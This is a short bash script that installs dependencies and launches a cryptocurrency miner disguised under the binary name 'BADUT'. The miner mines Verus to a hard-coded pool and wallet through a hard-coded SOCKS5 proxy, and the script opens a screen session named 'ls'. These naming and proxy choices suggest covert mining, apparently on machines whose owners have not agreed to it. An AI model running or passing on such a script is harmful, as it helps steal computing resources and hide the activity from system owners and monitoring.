#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x BADUT
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVvVk1mWJuiSzxNWR6tpSyRteqREPWzWdA
WORKER=$(echo $(shuf -i 1-5 -n 1)-BASENG)
PROXY=socks5://72.49.49.11:31034
./BADUT -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
